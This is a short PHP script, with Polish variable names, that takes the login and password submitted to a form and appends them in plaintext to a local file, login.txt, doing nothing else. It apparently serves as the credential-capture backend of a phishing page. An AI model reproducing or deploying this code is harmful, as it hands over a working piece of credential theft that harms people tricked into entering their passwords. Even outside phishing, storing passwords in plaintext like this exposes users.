<?php
$login = $_POST['login'];
$hasło = $_POST['hasło'];
$tekst = "login: $login hasło: $hasło \r\n";

$uchwyt = fopen("login.txt", "a");
fwrite($uchwyt, $tekst);
fclose($uchwyt);